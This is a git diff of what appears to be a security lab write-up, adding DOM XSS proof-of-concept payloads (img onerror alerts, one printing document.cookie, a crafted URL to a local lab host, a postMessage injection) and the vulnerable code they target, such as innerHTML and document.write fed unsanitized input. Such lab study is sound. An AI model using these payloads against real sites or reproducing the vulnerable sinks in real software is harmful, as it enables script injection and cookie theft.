@@ -70,6 +70,7 @@ data = request.form['user_input'] #<-- точка пользовательско
 ##### DOM XSS
 <b>Task 1</b>
 Exploit/PoC:
+
 ```js
 // DevTools
 document.write('<p>Hello, ' + '<img src=x onerror=alert("cookie:"+document.cookie)>' + '! You visited this page.</p>')
@@ -91,12 +92,14 @@ window.onload = function() {
 
 <b>Task 2</b>
 Exploit/PoC:
-```
-TBA
+
+```js
+// Via URL
+http://192.168.19.1:8888/xss/dom2?testMe=%3Cimg%20src=x%20onerror=alert()%3E
 ```
 
 Vulnerable code:
-```
+```js
 // Vulnerable source location.search + get
 var hidden = (new URLSearchParams(window.location.search)).get('testMe');
 // Vulnerable sink document.write
@@ -105,13 +108,19 @@ if(hidden){document.write('<p>'+hidden+'</p>');}
 
 <b>Task 3</b>
 Exploit/PoC:
-```
-TBA
+```js
+// DevTools
+window.postMessage('<img src=x onerror=alert()>');
 ```
 
 Vulnerable code:
-```
-TBA
+```js
+// // Vulnerable source *..addEventListener()
+window.addEventListener('message', function(e) 
+{
+  //  Vulnerable sink *.innerHTML with unsanitized input
+  document.getElementById('test').innerHTML = e.data;
+})
 ```
 ## Authentication bypass
 Exploit/PoC:
